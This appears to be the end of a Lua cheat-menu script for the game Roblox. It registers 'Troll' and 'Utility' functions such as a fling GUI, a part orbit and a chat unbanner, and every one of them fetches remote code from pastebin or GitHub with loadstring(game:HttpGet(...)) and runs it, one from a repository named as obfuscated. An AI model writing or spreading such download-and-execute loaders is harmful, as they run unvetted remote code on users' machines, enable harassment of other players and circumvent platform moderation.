	loadstring(game:HttpGet("https://raw.githubusercontent.com/ocfi/Scp-096-Obfuscated/refs/heads/main/obuf"))()
end, "Troll", "HATS")



FunctionManager:register("PART ORBIT", function()
	loadstring(game:HttpGet("https://pastebin.com/raw/aZjaAr6F", true))()
end, "Troll", "Probs better orbit")


FunctionManager:register("chat unbanner", function()
	loadstring(game:HttpGet("https://pastebin.com/raw/aDFhvMC4", true))()
end, "Utility", "Credits to the original maker!")
FunctionManager:register("Fling GUI", function()
	loadstring(game:HttpGet("https://pastebin.com/raw/VynRhxJV", true))()
end, "Troll", "Credits to the original maker!")



--init
updateGrid()
